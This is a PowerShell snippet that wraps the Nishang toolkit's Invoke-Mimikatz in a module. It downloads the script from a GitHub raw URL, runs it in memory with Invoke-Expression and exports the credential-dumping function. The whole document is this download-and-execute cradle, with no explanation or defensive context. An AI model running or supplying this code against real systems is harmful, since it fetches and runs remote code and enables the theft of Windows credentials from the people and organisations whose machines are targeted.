New-Module -Name Invoke-MimikatzModule -ScriptBlock {
    Invoke-Expression (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
	Export-ModuleMember -Function Invoke-Mimikatz
} | Import-Module